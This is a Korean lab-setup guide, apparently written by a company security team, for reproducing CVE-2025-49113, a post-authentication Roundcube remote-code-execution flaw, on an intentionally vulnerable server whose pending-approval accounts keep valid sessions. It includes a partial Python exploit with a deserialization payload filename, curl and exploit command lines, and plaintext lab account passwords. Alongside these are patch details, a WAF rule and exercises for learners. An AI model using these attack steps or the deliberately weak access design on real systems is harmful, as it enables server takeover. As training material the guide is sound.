# CVE-2025-49113 테스트 환경 구축 가이드

## 🎯 개요

이 문서는 **CVE-2025-49113** (Roundcube Post-Auth RCE) 취약점을 교육 목적으로 테스트하기 위한 환경 구축 가이드입니다.

### 취약점 정보
- **CVE ID**: CVE-2025-49113
- **영향 범위**: Roundcube 1.1.0 ~ 1.6.10
- **심각도**: Critical (CVSS 9.9)
- **유형**: Post-Authentication Remote Code Execution
- **공격 벡터**: PHP Object Deserialization via File Upload

---

## ⚠️ 중요 보안 경고

```
이 환경은 오직 교육 및 보안 연구 목적으로만 사용되어야 합니다.

절대 프로덕션 환경이나 공개 네트워크에 배포하지 마십시오!
반드시 격리된 내부망 또는 테스트 환경에서만 사용하세요.
```

---

## 🔍 CVE-2025-49113 상세 분석

### 취약점 개요
- **발견자**: Kirill Firsov (FearsOff CEO)
- **발견일**: 2025년 6월
- **존재 기간**: 약 10년간 미발견 상태
- **영향**: 전 세계 53만 개 이상의 호스트

### 공격 조건
1. ✅ **인증된 사용자** (로그인 필요)
2. ✅ **파일 업로드 기능** 접근 가능
3. ✅ **취약한 Roundcube 버전** (1.6.10 이하)

### 공격 메커니즘
```
1. 사용자가 Settings > User Identity > Upload Picture 페이지 접근
2. 특수하게 조작된 파일명으로 이미지 업로드
3. _from 파라미터 조작을 통한 세션 데이터 오염
4. PHP Object Deserialization 트리거
5. PEAR Crypt_GPG_Engine 클래스를 가젯으로 활용
6. 임의 시스템 명령 실행 (RCE)
```

### 핵심 취약 코드 경로
- **파일**: `program/actions/settings/upload.php`
- **함수**: `rcube_session::unserialize()`
- **트리거**: 파일명에 특수 문자 (`|`, `!`) 포함

---

## 🏗️ 테스트 환경 아키텍처

### 시스템 구성

```
┌─────────────────────────────────────────────────────┐
│          1xINV Webmail (Roundcube 1.6.6)             │
│              ⚠️ VULNERABLE VERSION ⚠️                │
├─────────────────────────────────────────────────────┤
│                                                       │
│  [회원가입 시스템]                                     │
│  ├─ 누구나 가입 가능 (@1xinv.com)                     │
│  ├─ 즉시 로그인 가능 ✅                               │
│  └─ 기능 제한 (승인 전)                               │
│                                                       │
│  [승인 대기 상태] - 완전 차단 모드                    │
│  ├─ 로그인: 가능 ✅                                   │
│  ├─ 로그아웃: 가능 ✅                                 │
│  ├─ 메일 확인: 차단 ❌                                │
│  ├─ 메일 발송: 차단 ❌                                │
│  ├─ 설정 변경: 차단 ❌                                │
│  ├─ 주소록 수정: 차단 ❌                              │
│  ├─ 파일 업로드: 차단 ❌                              │
│  └─ UI 접근: 차단 ❌ (승인 대기 페이지만 표시)        │
│                                                       │
│  [인사팀 승인 시스템]                                 │
│  └─ kang.mira@1xinv.com이 승인/거부                  │
│                                                       │
└─────────────────────────────────────────────────────┘

💡 핵심: 승인 대기 중 = 로그인 세션만 유지
         모든 기능 차단되지만 인증된 세션 존재
         → CVE-2025-49113 공격 가능 (Post-Auth)
```

---

## 📝 회원가입 시스템 동작 방식

### 1. 회원가입 프로세스

```bash
# 1단계: 회원가입 페이지 접속
http://webmail.1xinv.local/?_task=login&_action=plugin.user_registration

# 2단계: 정보 입력
- 이메일: test.user@1xinv.com
- 비밀번호: test1234
- 이름: 테스트 사용자
- 부서: 개발팀

# 3단계: 가입 완료
- users 테이블에 사용자 등록
- registration_pending 테이블에 승인 대기 상태 기록
- status = 'pending'
```

### 2. 로그인 (승인 전)

```bash
# 승인 대기 중에도 로그인 가능!
이메일: test.user@1xinv.com
비밀번호: test1234

# 로그인 후 상태
- ✅ 로그인 세션 유지 (인증된 상태)
- ✅ "승인 대기 중" 페이지 표시
- ❌ 메일 확인 불가 (UI 차단)
- ❌ 메일 발송 불가
- ❌ 설정 메뉴 접근 불가
- ❌ 파일 업로드 불가
- ❌ 주소록 접근 불가
- ❌ 모든 기능 차단 (로그인/로그아웃만 가능)
```

### 3. 기능 제한 메커니즘

```php
// user_registration 플러그인에서 후킹
- message_before_send → 차단
- preferences_save → 차단
- contact_create/update/delete → 차단
- attachment_upload → 차단
- message_compose → 차단
- folder_create/update/delete → 차단

// 태스크 접근 제한
- mail, settings, addressbook 접근 시 → 승인 대기 페이지로 리다이렉트
- 허용되는 태스크: login, logout만

// UI 차단
- CSS로 모든 버튼 숨김
- 메뉴 접근 차단

💡 완전 차단 모드: 로그인 세션만 유지, 기능 전부 차단!
```

---

## 🧪 CVE-2025-49113 테스트 시나리오

### 시나리오 1: 승인 대기 사용자 공격

```bash
# 1단계: 회원가입
http://webmail.1xinv.local/?_task=login&_action=plugin.user_registration
이메일: test@1xinv.com
비밀번호: your_password

# 2단계: 로그인 (승인 대기 상태)
http://webmail.1xinv.local
→ "승인 대기 중" 페이지 표시
→ 모든 기능 차단됨

# 3단계: 세션 확인
브라우저 개발자 도구 → Application → Cookies
→ roundcube_sessid 쿠키 존재 (인증된 세션)

# 4단계: CVE-2025-49113 Exploit
승인 대기 상태이지만 인증된 세션이 있으므로:
- PoC 스크립트로 직접 HTTP 요청 전송
- Burp Suite 등으로 요청 조작
- 세션 쿠키를 활용한 공격

💡 UI는 차단되었지만 백엔드 세션은 유효!
   → Post-Auth 공격 가능
```

### 시나리오 2: PoC 스크립트 활용

```python
# CVE-2025-49113 PoC
# GitHub: hakaioffsec/CVE-2025-49113-exploit

import requests

target = "http://webmail.1xinv.local"
username = "test@1xinv.com"  # 승인 대기 계정
password = "your_password"

# 1. 로그인 (승인 대기 상태)
session = requests.Session()
login_response = session.post(f"{target}/?_task=login", data={
    "_user": username,
    "_pass": password,
    "_action": "login"
})

print(f"[+] 로그인 상태: {session.cookies.get('roundcube_sessid')}")

# 2. UI는 차단되었지만 백엔드 API는 세션만 확인
#    따라서 직접 HTTP 요청으로 취약점 공격 가능

# 3. 악성 페이로드 전송 (UI 우회)
payload_filename = '12xxx|b:0;payload|O:17:"Crypt_GPG_Engine":1:{...}xxx|.png'

files = {'_file': (payload_filename, open('image.png', 'rb'), 'image/png')}
response = session.post(
    f"{target}/?_task=settings&_action=upload",
    files=files,
    params={'_from': 'identity'}
)

# 4. RCE 트리거
# 세션 재로드 시 악성 객체 deserialize
# → 임의 명령 실행

💡 핵심: 플러그인은 UI만 차단, 백엔드 API는 세션만 체크
         → 직접 HTTP 요청으로 우회 가능!
```

---

## 🛡️ 방어 메커니즘 (학습용)

### 패치된 버전
- Roundcube **1.6.11** 이상
- Roundcube **1.5.10** 이상

### 패치 내용
```php
// 파일명 검증 강화
if (preg_match('/[|!]/', $filename)) {
    throw new Exception('Invalid filename');
}

// 세션 deserialization 시 검증
if (strpos($key, '!') === 0) {
    // 안전하게 처리
}
```

### 임시 방어책 (패치 전)
1. **파일 업로드 제한**
```php
$config['enable_installer'] = false;
$config['max_filesize'] = 0;  // 업로드 완전 차단
```

2. **PEAR 라이브러리 제거**
```bash
# Crypt_GPG_Engine 클래스 제거
rm -rf vendor/pear/crypt_gpg
```

3. **WAF 규칙 추가**
```apache
# Apache mod_security
SecRule FILES_NAMES "@rx \|" "id:1001,deny,status:403,msg:'Blocked filename'"
```

---

## 📊 테스트 계정 정보

### 테스트 계정 생성

**직접 회원가입하여 계정 생성:**
```
회원가입 페이지: http://webmail.1xinv.local/?_task=login&_action=plugin.user_registration

- 이메일: @1xinv.com 도메인 필수
- 비밀번호: 6자 이상
- 이름, 부서 입력
- 가입 후 자동으로 "승인 대기" 상태
```

### 기존 승인된 계정 (ACCOUNTS.md 참조)

| 이메일 | 비밀번호 | 역할 | 상태 |
|--------|---------|------|------|
| ceo@1xinv.com | ceo2025admin | 대표이사 | 승인됨 |
| kang.mira@1xinv.com | kangmr2468 | 인사팀 (승인 권한) | 승인됨 |
| support@1xinv.com | 1xinvrhksfl13 | 고객지원 | 승인됨 |
| (기타 8개 직원 계정) | - | - | 승인됨 |

### 승인 관리 페이지 (인사팀 전용)
```
http://webmail.1xinv.local/?_task=login&_action=plugin.user_approval

kang.mira@1xinv.com으로 로그인 후 접근 가능
- 승인 대기 목록 확인
- 승인/거부 처리
```

---

## 🔬 테스트 절차

### 1단계: 환경 구축
```bash
# Ubuntu 서버에 Roundcube 설치
cd /var/www/html/webmail

# 취약한 버전 확인
cat index.php | grep "Version 1.6.6"  # ✅ 취약

# 플러그인 활성화 확인
grep user_registration config/config.inc.php
```

### 2단계: 테스트 계정 생성
```bash
# 브라우저에서 회원가입
http://webmail.1xinv.local/?_task=login&_action=plugin.user_registration

# 정보 입력
- 이메일: test@1xinv.com (또는 원하는 이메일)
- 비밀번호: yourpassword
- 이름: 테스터
- 부서: 테스트팀

# 가입 완료 → 자동으로 "승인 대기" 상태
```

### 3단계: 로그인 및 권한 확인
```bash
# 1. 로그인
http://webmail.1xinv.local
ID: test@1xinv.com
PW: yourpassword

# 2. 상태 확인
- "승인 대기 중" 페이지 표시
- 모든 메뉴 접근 차단
- 로그인/로그아웃만 가능

# 3. 세션 확인 (개발자 도구)
- Application → Cookies → roundcube_sessid 존재
- 인증된 세션 유지됨
```

### 4단계: 취약점 테스트
```bash
# UI는 차단되었지만 백엔드 세션은 유효
# 따라서 직접 HTTP 요청으로 CVE 공격 가능

# 방법 1: PoC 스크립트 사용
python3 cve-2025-49113-exploit.py \
  --url http://webmail.1xinv.local \
  --username test@1xinv.com \
  --password yourpassword \
  --command "id"

# 방법 2: Burp Suite로 요청 조작
# 1. 세션 쿠키 추출
# 2. 악성 요청 수동 전송
# 3. _from 파라미터 조작

# 방법 3: curl로 직접 요청
curl -X POST \
  -H "Cookie: roundcube_sessid=YOUR_SESSION" \
  -F "_file=@malicious.png" \
  "http://webmail.1xinv.local/?_task=settings&_action=upload&_from=identity"
```

### 5단계: 결과 확인
```bash
# 성공 시
- 시스템 명령 실행 결과 확인
- 웹 서버 권한으로 코드 실행됨 (www-data)

# 로그 확인
tail -f /var/www/html/webmail/logs/errors.log
tail -f /var/log/apache2/webmail_error.log
```

---

## 📈 학습 목표

### 이 환경을 통해 배울 수 있는 것

1. **Post-Auth 취약점의 위험성**
   - 로그인만으로는 보안이 보장되지 않음
   - 인증 후에도 입력 검증이 중요

2. **PHP Object Deserialization 공격**
   - 직렬화된 객체의 위험성
   - Magic Method 체인 공격

3. **권한 분리의 중요성**
   - 승인 대기 사용자에게도 일부 기능 노출
   - 최소 권한 원칙 위반 시 리스크

4. **파일 업로드 보안**
   - 파일명 검증의 중요성
   - 업로드 경로 제한

5. **취약점 패치 프로세스**
   - 업데이트의 중요성
   - 임시 완화 조치 방법

---

## 🔧 실습 과제

### 과제 1: 취약점 재현
- [ ] 테스트 계정 생성
- [ ] 승인 대기 상태 확인
- [ ] 파일 업로드 기능 접근
- [ ] 악성 파일명 업로드 시도
- [ ] 로그 분석

### 과제 2: 방어 구현
- [ ] 파일명 검증 코드 추가
- [ ] WAF 규칙 작성
- [ ] 업로드 기능 비활성화
- [ ] 패치 버전으로 업그레이드

### 과제 3: 보안 강화
- [ ] 승인 시스템 개선
- [ ] 최소 권한 원칙 적용
- [ ] 모니터링 알람 설정
- [ ] 침입 탐지 룰 작성

---

## 📚 참고 자료

### 공식 문서
- [Roundcube Security Advisory](https://roundcube.net/news/2025/06/08/security-update-1.6.11-released)
- [CVE-2025-49113 NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-49113)

### 기술 분석
- [FearsOff 상세 분석](https://fearsoff.org/research/roundcube)
- [OffSec 블로그](https://www.offsec.com/blog/cve-2025-49113/)

### PoC 및 Exploit
- [GitHub - hakaioffsec/CVE-2025-49113-exploit](https://github.com/hakaioffsec/CVE-2025-49113-exploit)

### 뉴스 및 보고서
- [The Hacker News](https://thehackernews.com/2025/06/critical-10-year-old-roundcube-webmail.html)
- [Censys Advisory](https://censys.com/advisory/cve-2025-49113)

---

## ⚖️ 법적 고지

```
이 테스트 환경은 교육 목적으로만 제공됩니다.

- 허가 없이 다른 시스템에 대한 공격 금지
- 내부망 또는 격리된 테스트 환경에서만 사용
- 발견된 취약점의 윤리적 공개 준수
- 관련 법규 및 규정 준수 필수

부적절한 사용으로 인한 법적 책임은 사용자에게 있습니다.
```

---

## 📞 문의

- **보안팀**: support@1xinv.com
- **교육 담당**: kang.mira@1xinv.com (인사팀)

---

**작성일**: 2025년 10월 27일
**작성자**: 1xINV IT Security Team
**버전**: 1.0
**목적**: 보안 교육 및 연구
